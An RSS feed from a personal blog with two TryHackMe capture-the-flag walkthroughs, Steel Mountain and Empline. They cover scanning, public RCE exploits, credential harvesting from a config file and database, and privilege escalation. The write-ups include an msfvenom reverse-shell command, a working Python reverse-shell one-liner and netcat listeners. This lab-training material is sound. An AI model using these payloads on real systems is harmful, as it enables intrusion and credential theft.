<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Sinameki&apos;Sarp&apos;s Playground</title>
    <description>Sinameki Sarp&apos;s CTF Writeups and blogposts...</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Sun, 27 Nov 2022 21:58:48 +0300</pubDate>
    <lastBuildDate>Sun, 27 Nov 2022 21:58:48 +0300</lastBuildDate>
    <generator>Jekyll v4.3.1</generator>
    
      <item>
        <title>TryHackMe: Steel Mountain CTF Writeup</title>
        <description>&lt;p&gt;TryHackMe easy level windows machine Steel Mountain boot2root walkthrough.&lt;/p&gt;

&lt;h2 id=&quot;discovery-part&quot;&gt;Discovery Part&lt;/h2&gt;

&lt;p&gt;Let‚Äôs begin with nmap port scan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 10.10.161.65
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There are 2 web server on the ports. 80 and 8080. Nmap trying to find all ports with ‚Äú&lt;strong&gt;-p-&lt;/strong&gt;‚Äù &lt;em&gt;**&lt;/em&gt;argument but it will be take time so let‚Äôs starts with web servers.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%201.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Source code:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%202.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I try directory fuzzing but nothing in there. Check port 8080.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%203.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This page is interesting because there is file server version info in ‚Äú&lt;strong&gt;Server Information&lt;/strong&gt;‚Äù section. I Search ‚Äú&lt;strong&gt;HttpFileServer 2.3&lt;/strong&gt;‚Äù on the internet.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%204.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Full name is ‚Äú&lt;strong&gt;Rejetto Http File Server&lt;/strong&gt;‚Äù. Let‚Äôs find is there any vulnerabilty for version.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%205.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It‚Äôs looks like ‚Äú&lt;strong&gt;metasploit&lt;/strong&gt;‚Äù has ‚Äú&lt;strong&gt;RCE(Remote Code Execution)&lt;/strong&gt;‚Äù exploit. Go to msfconsole‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;enumeration-part&quot;&gt;Enumeration Part&lt;/h2&gt;

&lt;p&gt;Search exploit and select what we want.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%206.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Look and set exploit‚Äôs options.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;show&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%207.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We need to change ‚Äú&lt;strong&gt;RHOSTS,RPORT,LHOST,LPORT,SRVHOST,SRVPORT&lt;/strong&gt;‚Äù.&lt;/p&gt;

&lt;p&gt;**&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RHOST** ‚áí &amp;lt;Target-Ip&amp;gt; (In my case will be 10.10.161.65)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;**&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RPORT** ‚áí &amp;lt;Target-Port&amp;gt; (In my case will be 8080)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;**&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LHOST** ‚áí &amp;lt;Local-Ip&amp;gt; (In my case will be 10.10.121.211)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;**&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LPORT** ‚áí &amp;lt;Listen-Port&amp;gt; (In my case will be 10.10.121.211)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;**&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SRVHOST** ‚áí &amp;lt;Local-WebServer-Ip&amp;gt; (In my case will be 10.10.121.211)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;**&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SRVPORT** ‚áí &amp;lt;Local-WebServer-Port&amp;gt; (In my case will be 4545)&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Option&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;VALUE&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We complete to assign all necessary option. Let‚Äôs run exploit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%208.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;aside&gt;
üí° `**Note: Exploit run can take times you must wait until finish and also if exploit not work you should check options and run again**`

&lt;/aside&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%209.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It‚Äôs looks like we are ‚Äú&lt;strong&gt;bill&lt;/strong&gt;‚Äù user. Let‚Äôs go to ‚Äú&lt;strong&gt;C:\Users\bill\Desktop&lt;/strong&gt;‚Äù and find user flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%2010.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation-part&quot;&gt;Privilege Escalation Part&lt;/h2&gt;

&lt;p&gt;Check system has any privilege escalation vulnerability. I will use ‚Äú&lt;strong&gt;winpeas&lt;/strong&gt;‚Äù tool. First upload ‚Äú&lt;strong&gt;winpeas.exe&lt;/strong&gt;‚Äù to target machine.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;(WinPeas: &lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS&quot;&gt;https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS&lt;/a&gt;)&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%2011.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We need to access ‚Äú&lt;strong&gt;Windows Powershell&lt;/strong&gt;‚Äù to run winPEAS.exe. First we have to load powershell module to our meterpreter.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;load&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;powershell&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then we need to start powershell command.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;powershell_shell&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and run ./winPEAS.exe on powershell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%2012.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and also we can use ‚Äú&lt;strong&gt;PowerUp.ps1&lt;/strong&gt;‚Äù powershell script for find to way privledge escaletion. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(Both tool is working correctly and give same result)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;PowerUp.Ps1:&lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1&quot;&gt;https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%2013.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%2014.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;with both script result we find our user has permission to write and add file  ‚Äú&lt;strong&gt;AdvancedSystemCareService9&lt;/strong&gt;‚Äù service and also this service can restart with manually.&lt;/p&gt;

&lt;p&gt;First we need to create executable reverse shell for root user. We can use ‚Äú&lt;strong&gt;msfvenom&lt;/strong&gt;‚Äù tool.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.121.211 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4443 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; x86/shikata_ga_nai &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; exe-service &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; Advanced.exe
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our executable file is ready. Let‚Äôs upload the machine and rename to ‚Äú&lt;strong&gt;ASCService.exe&lt;/strong&gt;‚Äù&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%2015.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Change to location and overwrite to file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%2016.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Our exe is ready. In another terminal we need to listen port which we specifed msfvenom.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4443
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;First stop the service then start again.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Stop: sc stop **AdvancedSystemCareService9**&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Start: sc start **AdvancedSystemCareService9**&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%2017.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;thank-you-for-reading-&quot;&gt;THANK YOU FOR READING üôÇ&lt;/h3&gt;
</description>
        <pubDate>Sun, 27 Nov 2022 00:00:00 +0300</pubDate>
        <link>http://localhost:4000/TryHackMe-SteelMountain/</link>
        <guid isPermaLink="true">http://localhost:4000/TryHackMe-SteelMountain/</guid>
        
        <category>red</category>
        
        <category>yellow</category>
        
        
        <category>TryHackMe</category>
        
        <category>CTF</category>
        
        <category>Writeup</category>
        
      </item>
    
      <item>
        <title>TryHackMe: Empline CTF Writeup</title>
        <description>&lt;p&gt;TryHackMe medium level web machine Empline boot2root walkthrough.&lt;/p&gt;
&lt;h2 id=&quot;discovery-part&quot;&gt;Discovery Part&lt;/h2&gt;

&lt;p&gt;First thing I scan all ports what services are running on the server.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 10.10.70.209
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/1.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Server has a &lt;strong&gt;web service&lt;/strong&gt;, &lt;strong&gt;ssh&lt;/strong&gt; service and &lt;strong&gt;mysql&lt;/strong&gt; database. Then I go to webpage.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/2.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nothing is there‚Ä¶ so I wonder is there any subdomain. First assigned ip to empline.thm in &lt;strong&gt;‚Äú/etc/hosts‚Äù&lt;/strong&gt; document. Then I use &lt;strong&gt;wfuzz&lt;/strong&gt; for find subdomains.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host:FUZZ.empline.thm&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://empline.thm/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/SecList
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/Untitled.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So there is one subdomain ‚Äú&lt;strong&gt;job.empline.thm&lt;/strong&gt;‚Äù. I look what is in there and I find login page&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/3.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and also ‚Äú&lt;strong&gt;opencats‚Äù&lt;/strong&gt; is running on the system. I checked source code any information about ‚Äú&lt;strong&gt;opencats version&lt;/strong&gt;‚Äù.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/4.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So I know version number and I search any exploit for ‚Äú&lt;strong&gt;opencats 0.9.4&lt;/strong&gt;‚Äù.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/5.png&quot; alt=&quot;5.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeration-part&quot;&gt;Enumeration Part&lt;/h2&gt;

&lt;p&gt;Perfect!! There is a ‚Äú&lt;strong&gt;RCE(Remote Code Execution)‚Äù&lt;/strong&gt; exploit suitable for the machine. I get the exploit from searchsploit and run‚Ä¶..&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/6.png&quot; alt=&quot;6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is working!!! But something is wrong. Yes I can run the commands but its not like real shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/7.png&quot; alt=&quot;7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is not exactly shell but we can get shell easily from command execution. Server has python3 so I can run python code. I made reverse shell payload with python.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;python3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.8.8.50&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&apos;&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I run the python code on target machine and In my machine I use netcat for listen port.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;nc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lvnp&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1234&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/8.png&quot; alt=&quot;8.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I got the shell‚Ä¶ I checked is there any config files for &lt;strong&gt;‚Äúopencats‚Äù&lt;/strong&gt;. I went to ‚Äú&lt;strong&gt;/var/www/html/opencats&lt;/strong&gt;‚Äù folder. Let‚Äôs look files.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/9.png&quot; alt=&quot;9.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;‚Äúconfig.php‚Äù&lt;/strong&gt; file can contains important data. I read the file with cat command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/10.png&quot; alt=&quot;10.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I can login mysql database with this information. Let‚Äôs try‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/11.png&quot; alt=&quot;11.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I succesfully loged in with credentials. I found databases. Let‚Äôs continue with opencats.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/Untitled%201.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‚Äú&lt;strong&gt;user&lt;/strong&gt;‚Äù table looks interesting.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/12.png&quot; alt=&quot;12.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There are encrypted passwords. I check ‚Äú&lt;strong&gt;crackstation.net&lt;/strong&gt;‚Äù&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/13.png&quot; alt=&quot;13.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I know the password but I need user‚Äôs name for ssh. I looked users on the machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/Untitled%202.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Try login ssh with username and password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/14.png&quot; alt=&quot;14.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation-part&quot;&gt;Privilege Escalation Part&lt;/h2&gt;

&lt;p&gt;Find and read user flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/15.png&quot; alt=&quot;15.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Last thing I need to become root for successfully finish the machine. I upload ‚Äú&lt;strong&gt;linpeas.sh‚Äù&lt;/strong&gt; tool for find any information become root.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Empline%20Writeup%200a987ba5c27248e5a170ba2bc5bcf4e8/16.png&quot; alt=&quot;16.png&quot; /&gt;&lt;/p&gt;

